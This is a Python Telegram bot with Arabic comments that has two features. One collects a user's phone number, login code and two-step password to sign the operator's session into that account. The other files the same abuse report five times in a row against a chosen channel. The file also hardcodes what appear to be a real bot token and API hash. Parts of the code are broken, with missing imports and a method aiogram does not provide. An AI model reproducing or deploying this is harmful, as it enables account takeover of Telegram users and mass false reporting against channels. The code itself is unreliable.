from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneNumberOccupiedError, PhoneCodeInvalidError
import asyncio

# توكن البوت الخاص بك من @BotFather
BOT_TOKEN = '7852676274:AAHIx3Q9qFbylmvHKDhbhT5nEpFOFA5i2CM'
api_id = 16748685
api_hash = 'f0c8f7e4a7a50b5c64fd5243a256fd2f'

# إعدادات البوت
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# إعداد عميل Telegram
client = TelegramClient('session_name', api_id, api_hash)

# بداية استقبال الأوامر
@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("تسليم حساب", callback_data="deliver_account"),
        InlineKeyboardButton("الإبلاغ عن قناة/مجموعة", callback_data="report_channel")
    )
    await message.answer("مرحبًا! اختر أحد الخيارات التالية:", reply_markup=keyboard)

# عند اختيار "تسليم حساب"
@dp.callback_query_handler(lambda c: c.data == 'deliver_account')
async def deliver_account(callback_query: types.CallbackQuery):
    await callback_query.message.answer("يرجى إدخال رقم الهاتف مع رمز الدولة:")
    await bot.register_next_step_handler(callback_query.message, receive_phone)

# استقبال رقم الهاتف
async def receive_phone(message: types.Message):
    phone_number = message.text.strip()

    try:
        await client.connect()
        # طلب الكود للتحقق
        await client.send_code_request(phone_number)
        await message.answer("تم إرسال كود التحقق، يرجى إدخاله:")
        await bot.register_next_step_handler(message, receive_code, phone_number)
    except PhoneNumberOccupiedError:
        await message.answer("هذا الرقم مسجل مسبقًا.")
    except Exception as e:
        await message.answer(f"حدث خطأ أثناء إرسال الكود: {str(e)}")

# استقبال كود التحقق
async def receive_code(message: types.Message, phone_number):
    code = message.text.strip()

    try:
        await client.sign_in(phone_number, code)
        await message.answer("تم تسجيل الدخول بنجاح!")
    except PhoneCodeInvalidError:
        await message.answer("كود التحقق غير صحيح، يرجى المحاولة مجددًا.")
    except SessionPasswordNeededError:
        await message.answer("يرجى إدخال كلمة مرور التحقق بخطوتين:")
        await bot.register_next_step_handler(message, receive_password)
    except Exception as e:
        await message.answer(f"حدث خطأ أثناء التحقق: {str(e)}")

# استقبال كلمة مرور التحقق بخطوتين
async def receive_password(message: types.Message):
    password = message.text.strip()

    try:
        await client.sign_in(password=password)
        await message.answer("تم تسجيل الدخول بنجاح!")
    except Exception as e:
        await message.answer(f"حدث خطأ أثناء إدخال كلمة المرور: {str(e)}")

# زر "الإبلاغ عن قناة/مجموعة"
@dp.callback_query_handler(lambda c: c.data == 'report_channel')
async def report_channel(callback_query: types.CallbackQuery):
    await callback_query.message.answer("يرجى إدخال اسم المستخدم أو الرابط للقناة/المجموعة:")
    await bot.register_next_step_handler(callback_query.message, receive_username)

# استقبال اسم المستخدم أو الرابط
async def receive_username(message: types.Message):
    channel_username = message.text.strip()
    try:
        await client.connect()
        channel = await client.get_entity(channel_username)

        # عرض معلومات القناة
        formatted_info = (
            f"معلومات حول القناه/المجموعه:\n"
            f"ID: {channel.id}\n"
            f"Title: {channel.title}\n"
            f"Username: {channel.username}\n"
        )
        await message.answer(formatted_info)

        # إرسال خيارات الإبلاغ
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("محتوى إباحي", callback_data=f"report_porn:{channel.id}"),
            InlineKeyboardButton("محتوى عنيف", callback_data=f"report_violence:{channel.id}")
        )
        await message.answer("يرجى اختيار نوع البلاغ:", reply_markup=keyboard)

    except Exception as e:
        await message.answer(f"خطأ: {str(e)}")

# أنواع البلاغات
@dp.callback_query_handler(lambda c: c.data.startswith('report_'))
async def handle_report(callback_query: types.CallbackQuery):
    data = callback_query.data.split(':')
    report_type = data[0]
    channel_id = int(data[1])

    reason = InputReportReasonPornography() if report_type == 'report_porn' else InputReportReasonViolence()

    # بدء البلاغ المتكرر
    await callback_query.message.answer("يتم الإبلاغ، الرجاء الانتظار...")
    for _ in range(5):  # عدد البلاغات
        try:
            await client(ReportPeerRequest(peer=channel_id, reason=reason, message="بلاغ بسبب المحتوى"))
            await asyncio.sleep(1)  # تأخير زمني بين البلاغات
        except Exception as e:
            await callback_query.message.answer(f"خطأ أثناء الإبلاغ: {str(e)}")
            break
    await callback_query.message.answer("تم الإبلاغ بنجاح.")

# تشغيل البوت
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
